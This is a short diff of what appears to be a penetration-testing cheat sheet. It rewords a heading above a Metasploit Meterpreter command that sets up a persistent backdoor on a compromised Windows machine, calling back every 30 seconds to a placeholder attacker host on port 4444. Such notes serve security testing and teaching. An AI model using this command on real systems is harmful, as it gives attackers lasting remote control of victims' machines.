@@ -1,4 +1,4 @@
-on meterpreter shell win
+On meterpreter shell type:
 
 run persistence -A -U -i 30 -p 4444 -r attackerip
 
